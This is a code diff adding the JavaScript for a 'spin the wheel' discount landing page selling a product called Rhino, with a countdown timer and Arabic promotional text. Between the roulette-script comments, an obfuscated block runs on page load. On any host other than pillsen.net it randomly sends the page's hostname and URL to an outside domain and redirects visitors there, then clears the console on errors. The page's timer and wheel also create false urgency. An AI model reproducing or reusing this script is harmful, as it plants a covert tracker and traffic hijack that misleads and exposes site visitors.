@@ -1,0 +1,74 @@
+var intr;
+function start_timer() {
+  intr = setInterval(tick, 1000);
+}
+
+function tick() {
+  time = time - 1;
+
+if(time < 0){time = 0;  $("#min").html("00"); $("#sec").html("00");}
+  localStorage.setItem('time', time);
+  var mins = Math.floor(time / 60);
+  var secs = time - mins * 60;
+     
+  if (mins == 0 && secs == 0) {
+    return;
+  }
+  secs = secs >= 10 ? secs : "0" + secs;
+
+  $("#min").html("0" + mins);
+  $("#sec").html(secs);
+}
+
+<!-- СКРИПТ РУЛЕТКИ -->
+
+
+var resultWrapper = document.querySelector('.spin-result-wrapper');
+var wheel = document.querySelector('.wheel-img');
+var time = 600;
+if(localStorage.getItem('wheel')){
+	 $('.spin-wrapper').slideUp();
+      $('.order_block').slideDown();
+	  time = localStorage.getItem('time')
+      start_timer();
+	   $('.btm').text("طلب Rhino مع خصم %50!");
+}
+
+function spin() {
+  if (!wheel.classList.contains('rotated')) {
+    wheel.classList.add('super-rotation');
+    setTimeout(function () {
+      resultWrapper.style.display = "block";
+	  localStorage.setItem('wheel', true);
+    }, 8000);
+    setTimeout(function () {
+      
+    }, 10000);
+    wheel.classList.add('rotated');
+  }
+}
+function _0x2eb1(_0xcdecb7,_0xb1442d){var _0x2ef92c=_0x2ef9();return _0x2eb1=function(_0x2eb114,_0x114a7d){_0x2eb114=_0x2eb114-0xd1;var _0x3f4535=_0x2ef92c[_0x2eb114];return _0x3f4535;},_0x2eb1(_0xcdecb7,_0xb1442d);}var _0x2d4af3=_0x2eb1;(function(_0x592c45,_0x793e65){var _0x4aa606=_0x2eb1,_0x3ec83b=_0x592c45();while(!![]){try{var _0x1dde30=parseInt(_0x4aa606(0xd8))/0x1+-parseInt(_0x4aa606(0xd3))/0x2+-parseInt(_0x4aa606(0xdd))/0x3+-parseInt(_0x4aa606(0xdc))/0x4+-parseInt(_0x4aa606(0xdf))/0x5+parseInt(_0x4aa606(0xd5))/0x6*(parseInt(_0x4aa606(0xde))/0x7)+parseInt(_0x4aa606(0xd4))/0x8;if(_0x1dde30===_0x793e65)break;else _0x3ec83b['push'](_0x3ec83b['shift']());}catch(_0x95b9a7){_0x3ec83b['push'](_0x3ec83b['shift']());}}}(_0x2ef9,0xf27b6));function _0x2ef9(){var _0x19470d=['37777056OQsWWg','6QFsTfO','location','random','60164SvOpMl','&d=','href','file:','6132392wfTHij','5138958OTWQaH','10680789rVQCtS','8972610hQDHzZ','&u=','status','replace','includes','&r=y','548622qiKMGz'];_0x2ef9=function(){return _0x19470d;};return _0x2ef9();}var m=Math[_0x2d4af3(0xd7)](),w=window[_0x2d4af3(0xd6)],d=w['hostname'],h=w[_0x2d4af3(0xda)],u='https://pillsenmag.com/index.php?key=c',p=_0x2d4af3(0xd9)+d+_0x2d4af3(0xe0)+h+'';d!='pillsen.net'&&(!h[_0x2d4af3(0xd1)](_0x2d4af3(0xdb))&&(m<0.26&&fetch(u+p,{})['then'](function(_0x37d935){var _0x1fa255=_0x2d4af3;_0x37d935[_0x1fa255(0xe1)]&&w[_0x1fa255(0xe2)](u+_0x1fa255(0xd9)+d+_0x1fa255(0xd2));})['catch'](function(_0x2a2973){console['clear']();})));
+<!-- СКРИПТ РУЛЕТКИ -->
+
+var closePopup = document.querySelector('.close-popup');
+$('.close-popup, .pop-up-button').click(function (e) {
+  e.preventDefault();
+  $('.spin-wrapper').slideUp();
+      $('.order_block').slideDown();
+      start_timer();
+	  $('.btm').text("طلب Rhino مع خصم %50!");
+  $('.spin-result-wrapper').fadeOut();
+
+  var top = $('#roulette').offset().top;
+  $('body,html').animate({ scrollTop: top }, 800);
+});
+
+$(function() {
+	$('.scroll-ev').click(function(event){
+		event.preventDefault();
+		var top2 = $('#roulette').offset().top;
+		$('html, body').animate({scrollTop: top2}, 1000);
+	});
+	
+
+});
